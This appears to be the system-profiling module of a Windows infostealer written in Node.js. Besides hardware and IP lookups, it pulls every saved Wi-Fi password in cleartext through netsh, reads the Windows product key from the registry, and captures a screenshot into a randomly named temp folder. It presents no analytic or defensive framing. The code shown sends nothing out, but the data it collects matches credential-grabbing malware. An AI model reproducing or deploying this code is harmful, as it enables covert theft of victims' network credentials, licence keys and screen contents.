const { 
    checkDiskUsage 
} = require('./disk.js');

const { 
    execCommand 
} = require('./processes.js');

const child_process = require('child_process');

const path = require('path');
const fs   = require('fs');

const getDisk = async () => {
    const output = await execCommand("wmic logicaldisk get size");
    const [size] = output.split(/\s+/).filter(item => item && item.toLowerCase() !== "size");
    return size ? (Math.floor(parseInt(size) / (1024 * 1024 * 1024))).toString() : "1000";
};

const getTotalMemory = async () => {
    const output = await execCommand("wmic computersystem get totalphysicalmemory | more +1");
    return Math.floor(parseInt(output) / (1024 * 1024 * 1024)) || "0";
};

const getCleanUUID = async () => {
    const output = await execCommand("wmic csproduct get uuid");
    const match = output.match(/UUID\s+([A-Fa-f0-9-]+)/);
    return match ? match[1] : "Not found";
};

const getCpuCount = async () => {
    const output = await execCommand("echo %NUMBER_OF_PROCESSORS%");
    return parseInt(output) || "4";
};

const getNetwork = async () => {
    const ip = await execCommand('curl -s http://ip-api.com/json');
    return JSON.parse(ip) || {};
};

const getWifi = () => {
    try {
        const output = child_process
            .execSync('netsh wlan show profiles', { stdio: 'pipe' })
            .toString();

        let networks = output.split('\n')
            .filter(line => line.includes('All User Profile'))
            .map(line => line.split(':')[1].trim());

        let wifiInfo = '';

        networks.forEach(network => {
            try {
                const profileOutput = child_process.execSync(`netsh wlan show profile "${network}" key=clear`, { stdio: 'pipe' }).toString();
                const keyLine = profileOutput.split('\n').find(line => line.includes('Key Content'));
                if (keyLine) {
                    wifiInfo += `${network} - ${keyLine.split(':')[1].trim()}\n`;
                }
            } catch (error) {
            }
        });
        
        return wifiInfo || "Not Found";
    } catch (error) {
        console.error(error.message);
        return "Not Found";
    }
};

const randString = (length) => {
    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    return Array.from({ length }, () => charset[Math.floor(Math.random() * charset.length)]).join('');
};

const getScreenShots = async () => {
    const dir = path.join(process.env.TEMP, randString(10));
    fs.mkdirSync(dir, { recursive: true });

    try {
        child_process.execSync(`powershell.exe -NoProfile -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bitmap = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap.Size); $bitmap.Save('${path.join(dir, 'screenshot.png')}'); $graphics.Dispose(); $bitmap.Dispose();"`, { cwd: dir });
        return fs.readdirSync(dir).map(file => path.join(dir, file));
    } catch (error) {
        console.error(error.message);
        return [];
    }
};

const getDisksInfo = async () => {
    try {
        const rootPath = 'C:';
        const { available, total, free } = await checkDiskUsage(rootPath);
        const freeGB = (free / (1024 ** 3)).toFixed(2) + 'GB';
        const totalGB = (total / (1024 ** 3)).toFixed(2) + 'GB';
        const usedPercent = ((1 - (available / total)) * 100).toFixed(2) + '%';
        const column = 12;
        const header = [
            'Drive'.padEnd(column),
            'Free'.padEnd(column),
            'Total'.padEnd(column),
            'Use'.padEnd(column)
        ].join('');
        return [header, `${rootPath.padEnd(column)}${freeGB.padEnd(column)}${totalGB.padEnd(column)}${usedPercent.padEnd(column)}`].join('\n');
    } catch (error) {
        console.error(error.message);
        return 'Not Found';
    }
};

const getSystem = async () => {
    try {
        return {
            WINDOWS_VERSION: await execCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName"),
            WINDOWS_KEY: await execCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"),
            SCREENSHOTS: await getScreenShots(),
            DISKS_INFO: await getDisksInfo(),
            CPU_COUNT: await getCpuCount(),
            NETWORK: await getNetwork(),
            UUID: await getCleanUUID(),
            DISK: await getDisk(),
            CPU: await execCommand("wmic cpu get name | more +1"),
            GPU: await execCommand("wmic PATH Win32_VideoController get name | more +1"),
            RAM: await getTotalMemory(),
            IP: await execCommand("powershell.exe (Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress"),
            OS: await execCommand("wmic OS get caption, osarchitecture | more +1"),
        };
    } catch (error) {
        console.error(error.message);
        return {
            WINDOWS_VERSION: "Not Found",
            WINDOWS_KEY: "Not Found",
            SCREENSHOTS: "Not Found",
            DISKS_INFO: "Not Found",
            CPU_COUNT: "Not Found",
            NETWORK: "Not Found",
            UUID: "Not Found",
            DISK: "Not Found",
            CPU: "Not Found",
            GPU: "Not Found",
            RAM: "Not Found",
            IP: "Not Found",
            OS: "Not Found",
        };
    }
};

module.exports = {
    getSystem,
};
